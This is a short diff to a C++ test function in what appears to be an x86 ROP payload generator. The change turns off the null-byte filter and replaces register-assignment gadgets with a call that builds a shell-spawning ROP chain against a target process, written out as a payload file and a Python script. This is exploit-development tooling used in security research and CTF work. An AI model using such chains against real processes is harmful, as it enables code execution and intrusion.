@@ -1072,7 +1072,7 @@ void testPayloadGeneration() {
     pv(targetPid); pn;
 
     PayloadGenX86 generator(targetPid);
-    generator.forbidNullBytesInPayload = true;
+    generator.forbidNullBytesInPayload = false;
     generator.ignoreDuplicateInstructionSequenceResults = true;
     generator.numAcceptablePaddingBytesForOneInstruction = 400;
     generator.numVariantsToOutputForEachStep = 0; // all of them.
@@ -1081,9 +1081,11 @@ void testPayloadGeneration() {
     // generator.appendGadgetForCopyOrExchangeRegisters(X86_REG_RAX, X86_REG_RDX, {});
     // generator.appendGadgetForCopyOrExchangeRegisters(X86_REG_RBX, X86_REG_RAX, {X86_REG_RAX});
 
-    generator.appendGadgetForAssignValueToRegister(X86_REG_RAX, 0x00112233, {});
-    generator.appendGadgetForAssignValueToRegister(X86_REG_RBX, 0x11223344, {});
-    generator.appendGadgetForAssignValueToRegister(X86_REG_RCX, -1, {});
+    // generator.appendGadgetForAssignValueToRegister(X86_REG_RAX, 0x00112233, {});
+    // generator.appendGadgetForAssignValueToRegister(X86_REG_RBX, 0x11223344, {});
+    // generator.appendGadgetForAssignValueToRegister(X86_REG_RCX, -1, {});
+
+    generator.appendROPChainForShellCodeWithPathNullNull();
 
     generator.writePayloadToFile("_payload.dat");
     generator.writeScriptToFile("_payloadScript.py");
